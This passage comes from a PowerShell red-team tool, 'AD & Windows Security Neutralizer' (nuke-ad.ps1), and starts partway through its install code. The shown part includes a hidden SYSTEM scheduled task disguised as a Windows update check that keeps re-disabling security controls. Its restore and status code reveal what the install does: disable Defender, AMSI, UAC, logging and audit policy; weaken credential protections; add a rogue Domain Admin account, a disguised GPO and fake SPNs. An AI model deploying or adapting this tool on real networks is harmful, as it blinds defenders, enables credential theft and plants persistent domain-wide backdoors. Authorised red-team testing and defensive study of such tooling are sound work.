            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ErrorAction Stop
            Register-ScheduledTask -TaskName "WindowsUpdateHealthCheck" -Action $action -Trigger $trigger1,$trigger2 `
                -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
        } catch {
            throw "Scheduled task creation failed: $($_.Exception.Message) — may need SYSTEM or local admin (not just domain admin)"
        }
        return "Scheduled task 'WindowsUpdateHealthCheck' created (SYSTEM, 15-min + boot) — re-applies firewall/Defender/audit/WDigest"
    }

    # ── MARKER ──
    "deployed $(Get-Date -Format o)" | Out-File $Marker
}

# ══════════════════════════════════════════════════════════════════════
#  RESTORE FUNCTIONS
# ══════════════════════════════════════════════════════════════════════

function Restore-WindowsSecurity {
    Write-Header "RESTORING: Windows Security Controls"

    Invoke-Step "R1a-Firewall" {
        if (Test-Path "$BackupDir\firewall-backup.wfw") {
            netsh advfirewall import "$BackupDir\firewall-backup.wfw" 2>$null | Out-Null
        }
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True -ErrorAction Stop
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /f 2>$null | Out-Null
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /f 2>$null | Out-Null
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\PublicProfile" /v EnableFirewall /f 2>$null | Out-Null
        return "Firewall re-enabled, GPO override keys removed"
    }

    Invoke-Step "R1b-Defender" {
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f 2>$null | Out-Null
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /f 2>$null | Out-Null
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /f 2>$null | Out-Null
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /f 2>$null | Out-Null
        try {
            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction Stop
            Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction Stop
            Set-MpPreference -DisableIOAVProtection $false -ErrorAction Stop
            Set-MpPreference -DisableScriptScanning $false -ErrorAction Stop
        } catch {}
        try { Set-Service -Name WinDefend -StartupType Automatic -ErrorAction SilentlyContinue; Start-Service WinDefend -ErrorAction SilentlyContinue } catch {}
        return "Defender re-enabled (registry + cmdlet + service)"
    }

    Invoke-Step "R1c-UAC" {
        $uacKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        Set-ItemProperty $uacKey -Name EnableLUA -Value 1 -ErrorAction Stop
        Set-ItemProperty $uacKey -Name ConsentPromptBehaviorAdmin -Value 5 -ErrorAction Stop
        Set-ItemProperty $uacKey -Name PromptOnSecureDesktop -Value 1 -ErrorAction Stop
        return "UAC re-enabled"
    }

    Invoke-Step "R1d-AuditPolicy" {
        if (Test-Path "$BackupDir\audit-backup.csv") {
            $out = auditpol /restore /file:"$BackupDir\audit-backup.csv" 2>&1
            if ($LASTEXITCODE -ne 0) { throw "auditpol restore failed: $out" }
            return "Audit policies restored from backup"
        }
        throw "No audit backup found at $BackupDir\audit-backup.csv"
    }

    Invoke-Step "R1e-EventLogs" {
        $criticalLogs = @("Security","System","Application","Microsoft-Windows-PowerShell/Operational","Windows PowerShell")
        $errs = @()
        foreach ($log in $criticalLogs) {
            $out = wevtutil sl $log /e:true 2>&1
            if ($LASTEXITCODE -ne 0) { $errs += "${log}: $out" }
        }
        if ($errs.Count -gt 0) { return "Re-enabled $($criticalLogs.Count - $errs.Count)/$($criticalLogs.Count) logs. Failures: $($errs -join '; ')" }
        return "All event logs re-enabled"
    }

    Invoke-Step "R1f-AMSI" {
        reg delete "HKLM\SOFTWARE\Microsoft\AMSI" /v AmsiEnable /f 2>$null | Out-Null
        return "AMSI registry key removed (AMSI re-enabled)"
    }

    Invoke-Step "R1g-PSLogging" {
        $psLogKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
        Remove-Item "$psLogKey\ScriptBlockLogging" -Force -ErrorAction SilentlyContinue
        Remove-Item "$psLogKey\ModuleLogging" -Force -ErrorAction SilentlyContinue
        Remove-Item "$psLogKey\Transcription" -Force -ErrorAction SilentlyContinue
        return "PowerShell logging policy keys removed (logging re-enabled)"
    }

    Invoke-Step "R1h-LSA" {
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f 2>&1 | Out-Null
        return "LSA RunAsPPL restored to 1"
    }

    Invoke-Step "R1i-CredGuard" {
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f 2>&1 | Out-Null
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f 2>&1 | Out-Null
        return "Credential Guard registry keys restored"
    }

    Invoke-Step "R1j-Auth" {
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 5 /f 2>&1 | Out-Null
        reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 1 /f 2>&1 | Out-Null
        reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 1 /f 2>&1 | Out-Null
        return "NTLMv2 enforced, SMB signing required"
    }

    Invoke-Step "R1k-WDigest" {
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f 2>&1 | Out-Null
        return "WDigest plaintext caching disabled"
    }
}

function Restore-AD {
    Write-Header "RESTORING: Active Directory"

    $script:adAvailable = $false
    try {
        Import-Module ActiveDirectory -ErrorAction Stop
        $null = Get-ADDomain -ErrorAction Stop
        $script:adAvailable = $true
    } catch {
        Record-Result "R2-Preflight" "FAIL" "AD module unavailable: $($_.Exception.Message)"
    }

    Invoke-Step "R2a-PasswordPolicy" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        if (-not (Test-Path "$BackupDir\password-policy.xml")) { throw "No backup found at $BackupDir\password-policy.xml" }
        $pol = Import-Clixml "$BackupDir\password-policy.xml"
        Set-ADDefaultDomainPasswordPolicy -Identity (Get-ADDomain) `
            -MinPasswordLength $pol.MinPasswordLength `
            -PasswordHistoryCount $pol.PasswordHistoryCount `
            -ComplexityEnabled $pol.ComplexityEnabled `
            -MinPasswordAge $pol.MinPasswordAge `
            -MaxPasswordAge $pol.MaxPasswordAge `
            -LockoutThreshold $pol.LockoutThreshold `
            -LockoutDuration $pol.LockoutDuration `
            -LockoutObservationWindow $pol.LockoutObservationWindow `
            -ReversibleEncryptionEnabled $false `
            -ErrorAction Stop
        return "Password policy restored from backup"
    }

    Invoke-Step "R2b-KerberosPreAuth" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        if (-not (Test-Path "$BackupDir\user-preauth-backup.xml")) { throw "No backup found" }
        $users = Import-Clixml "$BackupDir\user-preauth-backup.xml"
        $restored = 0; $failed = 0
        foreach ($u in $users) {
            if (Is-Protected $u.SamAccountName) { continue }
            try { Set-ADAccountControl $u.SamAccountName -DoesNotRequirePreAuth $u.DoesNotRequirePreAuth -ErrorAction Stop; $restored++ }
            catch { $failed++ }
        }
        return "Pre-auth restored on $restored users ($failed failed)"
    }

    Invoke-Step "R2c-LDAP" {
        reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LDAPServerIntegrity /t REG_DWORD /d 2 /f 2>&1 | Out-Null
        reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LdapEnforceChannelBinding /t REG_DWORD /d 2 /f 2>&1 | Out-Null
        return "LDAP signing and channel binding re-enforced"
    }

    Invoke-Step "R2e-KerbEncryption" {
        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" /v SupportedEncryptionTypes /t REG_DWORD /d 2147483640 /f 2>&1 | Out-Null
        return "Kerberos AES encryption types restored"
    }

    Invoke-Step "R2f-AdminSDHolder" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        if (Test-Path "$BackupDir\adminsdholder-acl.xml") {
            $acl = Import-Clixml "$BackupDir\adminsdholder-acl.xml"
            $domainDN = (Get-ADDomain).DistinguishedName
            Set-Acl "AD:CN=AdminSDHolder,CN=System,$domainDN" $acl -ErrorAction Stop
        }
        try {
            Remove-ADGroupMember -Identity "Domain Admins" -Members "svc-health-check" -Confirm:$false -ErrorAction Stop
        } catch {}
        try {
            Remove-ADUser -Identity "svc-health-check" -Confirm:$false -ErrorAction Stop
        } catch {}
        return "AdminSDHolder ACL restored, svc-health-check removed"
    }

    Invoke-Step "R2g-Tombstone" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        if (-not (Test-Path "$BackupDir\tombstone-backup.xml")) { throw "No backup found" }
        $ts = Import-Clixml "$BackupDir\tombstone-backup.xml"
        $configDN = (Get-ADRootDSE).configurationNamingContext
        $dirServDN = "CN=Directory Service,CN=Windows NT,CN=Services,$configDN"
        $lifetime = if ($ts.tombstoneLifetime) { $ts.tombstoneLifetime } else { 180 }
        Set-ADObject $dirServDN -Replace @{tombstoneLifetime=$lifetime} -ErrorAction Stop
        return "Tombstone lifetime restored to $lifetime days"
    }

    Invoke-Step "R2h-Replication" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        if (-not (Test-Path "$BackupDir\sitelinks-backup.xml")) { throw "No backup found" }
        $links = Import-Clixml "$BackupDir\sitelinks-backup.xml"
        $restored = 0; $failed = 0
        foreach ($link in $links) {
            try {
                Set-ADObject $link.DistinguishedName -Replace @{replInterval=$link.replInterval; cost=$link.cost} -ErrorAction Stop
                $restored++
            } catch { $failed++ }
        }
        return "Restored $restored site links ($failed failed)"
    }

    Invoke-Step "R2i-OUProtection" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        if (-not (Test-Path "$BackupDir\ou-protection-backup.xml")) { throw "No backup found" }
        $ous = Import-Clixml "$BackupDir\ou-protection-backup.xml"
        $restored = 0
        foreach ($ou in $ous) {
            try { Set-ADOrganizationalUnit $ou.DistinguishedName -ProtectedFromAccidentalDeletion $ou.ProtectedFromAccidentalDeletion -ErrorAction Stop; $restored++ } catch {}
        }
        return "OU protection restored on $restored OUs"
    }

    Invoke-Step "R2j-RogueGPO" {
        if (-not (Test-Path "$BackupDir\rogue-gpo-id.txt")) { throw "No GPO ID backup found" }
        $gpoId = Get-Content "$BackupDir\rogue-gpo-id.txt" | Select-Object -First 1
        $domainDN = (Get-ADDomain).DistinguishedName
        try { Remove-GPLink -Guid $gpoId -Target $domainDN -ErrorAction Stop } catch {}
        Remove-GPO -Guid $gpoId -ErrorAction Stop
        return "Rogue GPO removed"
    }

    Invoke-Step "R2k-DNS" {
        if (-not (Test-Path "$BackupDir\dns-forwarders.xml")) { throw "No DNS forwarder backup found" }
        Get-DnsServerForwarder | ForEach-Object {
            foreach ($ip in $_.IPAddress) { Remove-DnsServerForwarder -IPAddress $ip -Force -ErrorAction SilentlyContinue }
        }
        $fwd = Import-Clixml "$BackupDir\dns-forwarders.xml"
        $added = 0
        foreach ($ip in $fwd.IPAddress) {
            try { Add-DnsServerForwarder -IPAddress $ip -ErrorAction Stop; $added++ } catch {}
        }
        return "DNS forwarders restored ($added added)"
    }

    Invoke-Step "R2l-DNSScavenging" {
        if (-not (Test-Path "$BackupDir\dns-scavenging.xml")) { throw "No scavenging backup found" }
        $scav = Import-Clixml "$BackupDir\dns-scavenging.xml"
        Set-DnsServerScavenging -ScavengingState $scav.ScavengingState -ErrorAction Stop
        return "DNS scavenging restored"
    }

    Invoke-Step "R2m-SPNs" {
        if (-not $script:adAvailable) { throw "AD module not available" }
        if (-not (Test-Path "$BackupDir\spn-targets.xml")) { throw "No SPN backup found" }
        $users = Import-Clixml "$BackupDir\spn-targets.xml"
        $removed = 0
        foreach ($u in $users) {
            $fakeSPN = "HTTP/$($u.SamAccountName).internal.svc"
            try { Set-ADUser $u.SamAccountName -ServicePrincipalNames @{Remove=$fakeSPN} -ErrorAction Stop; $removed++ } catch {}
        }
        return "Fake SPNs removed from $removed accounts"
    }

    Invoke-Step "R2n-NTDS" {
        reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "Strict Replication Consistency" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
        try {
            $dse = [ADSI]"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,$((Get-ADRootDSE).configurationNamingContext)"
            $dse.Properties["dsHeuristics"].Value = "0000000"
            $dse.CommitChanges()
        } catch { throw "dsHeuristics restore failed: $_" }
        return "Strict replication consistency re-enabled, anonymous LDAP disabled"
    }

    Invoke-Step "R2o-LLMNR" {
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f 2>&1 | Out-Null
        return "LLMNR disabled"
    }

    Invoke-Step "R2p-SchedTask" {
        try {
            Unregister-ScheduledTask -TaskName "WindowsUpdateHealthCheck" -Confirm:$false -ErrorAction Stop
        } catch {
            throw "Task removal failed: $($_.Exception.Message) — may have been manually deleted or renamed"
        }
        Remove-Item "$BackupDir\reapply.ps1" -Force -ErrorAction SilentlyContinue
        return "Scheduled task removed"
    }

    Remove-Item $Marker -Force -ErrorAction SilentlyContinue
}

# ══════════════════════════════════════════════════════════════════════
#  STATUS CHECK
# ══════════════════════════════════════════════════════════════════════

function Show-Status {
    Write-Header "DEPLOYMENT STATUS"

    if (Test-Path $Marker) {
        Write-Status "DEPLOYED — $(Get-Content $Marker)"
    } else {
        Write-Warn "NOT DEPLOYED (no marker found)"
    }

    Write-Header "Windows Firewall"
    try {
        $fw = Get-NetFirewallProfile | Select-Object Name,Enabled
        foreach ($p in $fw) {
            if ($p.Enabled) { Write-Warn "$($p.Name): ENABLED (not neutralized)" }
            else { Write-Status "$($p.Name): DISABLED" }
        }
    } catch { Write-Fail "Cannot query firewall: $_" }

    Write-Header "Windows Defender"
    try {
        $def = Get-MpPreference
        if ($def.DisableRealtimeMonitoring) { Write-Status "Real-time monitoring: DISABLED" }
        else { Write-Warn "Real-time monitoring: ENABLED" }
    } catch { Write-Warn "Cannot query Defender: $_" }

    Write-Header "Audit Policy"
    $auditOut = auditpol /get /category:* 2>$null | Select-String "Success|Failure"
    if ($auditOut) { Write-Warn "Some audit policies still active ($($auditOut.Count) entries)" }
    else { Write-Status "Audit policies: CLEARED" }

    Write-Header "AD Domain Password Policy"
    try {
        Import-Module ActiveDirectory -ErrorAction Stop
        $pol = Get-ADDefaultDomainPasswordPolicy
        Write-Host "  MinPasswordLength:  $($pol.MinPasswordLength)"
        Write-Host "  ComplexityEnabled:  $($pol.ComplexityEnabled)"
        Write-Host "  LockoutThreshold:   $($pol.LockoutThreshold)"
        Write-Host "  ReversibleEncrypt:  $($pol.ReversibleEncryptionEnabled)"
    } catch { Write-Warn "Cannot query AD password policy: $_" }

    Write-Header "Rogue Accounts"
    try {
        $rogue = Get-ADUser -Filter "SamAccountName -eq 'svc-health-check'" -ErrorAction SilentlyContinue
        if ($rogue) {
            $daCheck = Get-ADGroupMember "Domain Admins" | Where-Object SamAccountName -eq "svc-health-check"
            if ($daCheck) { Write-Status "svc-health-check: EXISTS + in Domain Admins" }
            else { Write-Warn "svc-health-check: EXISTS but NOT in Domain Admins (SDProp may not have run yet)" }
        } else { Write-Warn "svc-health-check: NOT FOUND" }
    } catch { Write-Warn "Cannot query AD: $_" }

    Write-Header "Rogue GPO"
    try {
        $gpo = Get-GPO -Name "Windows Update Health Policy" -ErrorAction SilentlyContinue
        if ($gpo) {
            $links = (Get-GPOReport -Guid $gpo.Id -ReportType Xml | Select-Xml "//LinksTo").Node
            Write-Status "Windows Update Health Policy: EXISTS (GUID: $($gpo.Id))"
        } else { Write-Warn "Rogue GPO: NOT FOUND" }
    } catch { Write-Warn "Cannot query GPO: $_" }

    Write-Header "Scheduled Task"
    try {
        $task = Get-ScheduledTask -TaskName "WindowsUpdateHealthCheck" -ErrorAction SilentlyContinue
        if ($task) { Write-Status "WindowsUpdateHealthCheck: $($task.State)" }
        else { Write-Warn "WindowsUpdateHealthCheck: NOT FOUND" }
    } catch { Write-Warn "Cannot query scheduled tasks: $_" }

    Write-Header "Key Registry Values"
    $regChecks = @(
        @("LSA RunAsPPL", "HKLM\SYSTEM\CurrentControlSet\Control\Lsa", "RunAsPPL"),
        @("WDigest", "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest", "UseLogonCredential"),
        @("LmCompatibility", "HKLM\SYSTEM\CurrentControlSet\Control\Lsa", "LmCompatibilityLevel"),
        @("AMSI", "HKLM\SOFTWARE\Microsoft\AMSI", "AmsiEnable")
    )
    foreach ($rc in $regChecks) {
        $val = reg query $rc[1] /v $rc[2] 2>$null
        if ($val) {
            $parsed = ($val | Select-String "REG_DWORD") -replace '.*REG_DWORD\s+',''
            Write-Host "  $($rc[0]): $parsed"
        } else {
            Write-Host "  $($rc[0]): (not set)"
        }
    }

    Write-Header "Backups"
    if (Test-Path $BackupDir) {
        Write-Status "Backup directory: $BackupDir"
        Get-ChildItem $BackupDir -File | ForEach-Object { Write-Host "  $($_.Name)  ($([math]::Round($_.Length/1KB,1)) KB)" }
    } else {
        Write-Warn "No backup directory found — remove will not be able to restore original settings"
    }
}

# ══════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════

Write-Host ""
Write-Host "  ╔══════════════════════════════════════╗" -ForegroundColor Red
Write-Host "  ║   AD & Windows Security Neutralizer  ║" -ForegroundColor Red
Write-Host "  ║          Odessa Red Team              ║" -ForegroundColor Red
Write-Host "  ╚══════════════════════════════════════╝" -ForegroundColor Red
Write-Host ""

switch ($Mode) {
    "install" {
        Ensure-BackupDir
        Disable-WindowsSecurity
        Destroy-AD
        Show-Receipt
        Write-Status "Backups stored in: $BackupDir (hidden + system)"
        Write-Status "To reverse: .\nuke-ad.ps1 -Mode remove"
        Write-Warn "Some changes require reboot to take full effect"
        Write-Warn "GPO reapplies weakened settings every gpupdate cycle"
    }
    "remove" {
        Restore-WindowsSecurity
        Restore-AD
        Show-Receipt
        Write-Warn "Run 'gpupdate /force' on all domain machines"
        Write-Warn "Consider krbtgt double-rotation if golden tickets were used"
    }
    "status" {
        Show-Status
    }
}
